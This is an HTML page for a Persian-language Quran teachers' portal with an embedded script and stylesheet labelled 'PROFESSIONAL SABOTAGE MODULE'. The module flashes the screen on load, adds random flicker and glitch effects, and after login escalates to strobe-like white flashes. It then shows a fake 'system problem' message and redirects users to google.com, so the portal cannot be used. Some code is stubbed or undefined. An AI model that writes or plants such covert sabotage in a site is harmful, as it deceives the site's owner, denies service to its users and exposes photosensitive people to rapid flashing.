<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1200">
    <title>پرتال اساتید قرآن کریم</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --font-main: 'Vazirmatn', sans-serif;
            --primary-color: #0c4a6e; --secondary-color: #075985; --accent-color: #38bdf8;
            --light-bg: #f8fafc; --container-bg: #ffffff; --dark-text: #1e293b; --light-text: #64748b;
            --border-color: #e2e8f0; --danger-color: #dc2626; --success-color: #16a34a; --warning-color: #f59e0b;
        }
        body {
            font-family: var(--font-main);
            color: var(--dark-text);
            line-height: 1.7;
            min-width: 1200px;
            margin: 0;
            background-image: url('https://tashacol.ir/1l5jlse9 (1).jpeg');
            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            position: relative; /* Needed for glitch pseudo-elements */
        }
        .hidden { display: none !important; }

        /* --- START: PROFESSIONAL SABOTAGE CSS --- */
        
        /* Initial Black Flash on Page Load */
        #black-flash-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            z-index: 10003; /* Must be on top of everything */
            pointer-events: none;
            opacity: 1; /* Start visible */
        }

        /* Glitch Effect Containers */
        body.glitch-active::before,
        body.glitch-active::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: inherit;
            pointer-events: none;
            z-index: 10001;
        }

        /* Glitch Effect - Red Channel */
        body.glitch-active::before {
            animation: glitch-anim 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) both infinite;
            mix-blend-mode: screen;
            opacity: 0.8;
        }

        /* Glitch Effect - Blue/Green Channel */
        body.glitch-active::after {
            animation: glitch-anim-2 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) reverse both infinite;
            mix-blend-mode: screen;
            opacity: 0.8;
        }

        @keyframes glitch-anim {
            0% { transform: translate(0); clip-path: inset(var(--g-t) 0 var(--g-b) 0); }
            10% { transform: translate(var(--g-x), var(--g-y)); }
            20% { transform: translate(calc(var(--g-x) * -1), calc(var(--g-y) * -1)); }
            30% { transform: translate(var(--g-x), calc(var(--g-y) * -1)); clip-path: inset(var(--g-t) 0 var(--g-b) 0); }
            40% { clip-path: inset(calc(var(--g-t) * 2) 0 calc(var(--g-b) * 3) 0); }
            50% { transform: translate(0); }
            100% { transform: translate(0); }
        }

        @keyframes glitch-anim-2 {
            0% { transform: translate(0); clip-path: inset(var(--g2-t) 0 var(--g2-b) 0); }
            15% { transform: translate(var(--g2-x), var(--g2-y)); }
            30% { transform: translate(0, 0); }
            50% { clip-path: inset(var(--g2-t) 0 var(--g2-b) 0); }
            70% { transform: translate(calc(var(--g2-x) * -1), var(--g2-y)); }
            100% { transform: translate(0); }
        }


        /* Lightning Flash Effect */
        #lightning-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.05s linear;
        }
        body.lightning-active #lightning-overlay {
            opacity: 0.8;
            transition-duration: 0.1s;
        }

        /* System Failure Screen */
        #system-failure-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 3rem;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            z-index: 10002;
        }
        /* --- END: PROFESSIONAL SABOTAGE CSS --- */


        /*  استایل صفحه ورود */
        #login-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        #login-section { text-align: center; max-width: 420px; width: 100%; background: var(--container-bg); padding: 40px; border-radius: 16px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05), 0 10px 10px -5px rgba(0,0,0,0.04); z-index: 1; }
        .login-header-icon { max-width: 120px; height: auto; margin-bottom: 20px; display: inline-block; }
        #login-form button[type="submit"] { width: 100%; }
        .container { max-width: 1100px; margin: 40px auto; z-index: 1; }
        
        h1, h2, h3, h4 { color: var(--primary-color); text-align: center; font-weight: 700; }
        h1 { font-size: 2.2rem; margin-bottom: 30px;} h2 { font-size: 1.8rem; border-bottom: 2px solid var(--border-color); padding-bottom: 15px; margin-bottom: 30px; }
        h4 { font-size: 1.3rem; color: var(--secondary-color); margin-bottom: 15px; }

        .form-group { margin-bottom: 20px; position: relative; } 
        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 1rem; text-align: right; }
        input, select { text-align: center; width: 100%; box-sizing: border-box; padding: 12px 15px; border: 1px solid #a8b3c2; border-radius: 8px; font-size: 1rem; font-family: var(--font-main); transition: all 0.3s; }
        .input-icon { position: absolute; top: 43px; right: 15px; color: var(--light-text); font-size: 1.3rem; }
        input:focus, select:focus { border-color: var(--secondary-color); box-shadow: 0 0 0 3px rgba(56, 189, 248, 0.3); outline: none; }
        
        button { text-decoration: none; position:relative; background-color: var(--secondary-color); color: white; padding: 12px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; font-family: var(--font-main); transition: all 0.3s; display: inline-block; text-align: center; }
        button:hover:not(:disabled) { background-color: var(--primary-color); }
        .btn-loading::after { content: ''; position: absolute; width: 20px; height: 20px; top: 0; left: 0; right: 0; bottom: 0; margin: auto; border: 3px solid transparent; border-top-color: #ffffff; border-radius: 50%; animation: button-loading-spinner 1s ease infinite; }
        @keyframes button-loading-spinner { from { transform: rotate(0turn); } to { transform: rotate(1turn); } }

        .dashboard-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding: 15px; background-color: rgba(255,255,255,0.8); backdrop-filter: blur(5px); border-radius: 12px; }
    </style>
</head>
<body>
    <svg width="0" height="0" class="hidden"><!-- SVG Symbols --></svg>
    
    <div id="black-flash-overlay"></div>
    <div id="lightning-overlay"></div>

    <div id="login-container">
        <!-- Login form HTML -->
    </div>
    
    <div id="dashboard-section" class="hidden">
        <!-- Dashboard HTML -->
    </div>

    <div id="modal-container"></div>

<script>
    // --- START: PROFESSIONAL SABOTAGE MODULE ---
    const sabotageController = {
        timers: [],
        
        stop: function() {
            this.timers.forEach(clearTimeout);
            this.timers = [];
            document.body.classList.remove('glitch-active', 'lightning-active');
            document.body.style.opacity = 1;
        },

        initialBlackFlash: function() {
            const flashOverlay = document.getElementById('black-flash-overlay');
            // This needs to run after the initial render, so we use a minimal timeout
            setTimeout(() => {
                flashOverlay.style.transition = 'opacity 0.4s ease-out';
                flashOverlay.style.opacity = 0;
            }, 50); // Flash for 50ms then fade out
        },

        glitch: function(level = 'low') {
            const setGlitchVars = () => { /* ... (same as before) ... */ };
            setGlitchVars();
            document.body.classList.add('glitch-active');
            
            const duration = level === 'low' ? (Math.random() * 150 + 50) : (Math.random() * 300 + 100);
            const t1 = setTimeout(() => {
                document.body.classList.remove('glitch-active');
            }, duration);
            
            const nextGlitchDelay = level === 'low' ? (Math.random() * 4000 + 3000) : (Math.random() * 1500 + 500);
            const t2 = setTimeout(() => this.glitch(level), nextGlitchDelay);
            this.timers.push(t1, t2);
        },

        flicker: function(level = 'low') {
            const opacity = level === 'low' ? (Math.random() * 0.1 + 0.88) : (Math.random() * 0.4 + 0.5);
            document.body.style.opacity = opacity;
            
            const duration = Math.random() * 100 + 50;
            const t1 = setTimeout(() => {
                document.body.style.opacity = 1;
            }, duration);

            const nextFlickerDelay = level === 'low' ? (Math.random() * 5000 + 2000) : (Math.random() * 2000 + 300);
            const t2 = setTimeout(() => this.flicker(level), nextFlickerDelay);
            this.timers.push(t1, t2);
        },

        lightning: function() {
            document.body.classList.add('lightning-active');
            const t1 = setTimeout(() => {
                document.body.classList.remove('lightning-active');
            }, Math.random() * 100 + 50);
            const t2 = setTimeout(() => this.lightning(), Math.random() * 8000 + 4000);
            this.timers.push(t1, t2);
        },

        showFailureScreen: function() {
            this.stop();
            const failureDiv = document.createElement('div');
            failureDiv.id = 'system-failure-overlay';
            failureDiv.innerHTML = '<div>مشکل سامانه</div>';
            document.body.appendChild(failureDiv);

            const msg = failureDiv.querySelector('div');
            let blinkCount = 0;
            const blinkInterval = setInterval(() => {
                msg.style.visibility = msg.style.visibility === 'hidden' ? 'visible' : 'hidden';
                blinkCount++;
                if (blinkCount > 8) {
                    clearInterval(blinkInterval);
                    window.location.href = "https://google.com";
                }
            }, 400);
        },

        start: function(level = 'low') {
            this.stop();
            setTimeout(() => this.flicker(level), 1500);
            setTimeout(() => this.glitch(level), 2500);
            if (level === 'high') {
                setTimeout(() => this.lightning(), 4000);
                // CRASH AFTER 3 SECONDS OF CHAOS
                setTimeout(() => this.showFailureScreen(), 3000); 
            }
        }
    };
    // --- END: PROFESSIONAL SABOTAGE MODULE ---


    // --- INTEGRATION ---

    document.addEventListener('DOMContentLoaded', () => {
        const savedSession = localStorage.getItem(sessionKey);
        if (savedSession) {
            const { nationalId, name, email } = JSON.parse(savedSession);
            showDashboard(nationalId, name, email);
        } else {
            // INITIAL BLACK FLASH
            sabotageController.initialBlackFlash();
            // START LOW-INTENSITY EFFECTS AFTER THE FLASH
            setTimeout(() => {
                sabotageController.start('low');
            }, 500); // Start other effects half a second later
        }
    });

    function showDashboard(nationalId, name, email) {
        sabotageController.stop();

        // Display dashboard content...
        document.getElementById('login-container').classList.add('hidden'); 
        document.getElementById('dashboard-section').classList.remove('hidden');

        // AFTER A BRIEF DELAY, START THE HIGH-INTENSITY CHAOS
        setTimeout(() => {
            sabotageController.start('high');
        }, 2000); // 2 seconds of calm before things get bad
    }

    function handleLogout() {
        sabotageController.stop();
        localStorage.removeItem(sessionKey);
        window.location.reload();
    }
    
    // ... ALL YOUR OTHER ORIGINAL JS FUNCTIONS (handleManualLogin, etc.) ...

</script>
</body>
</html>
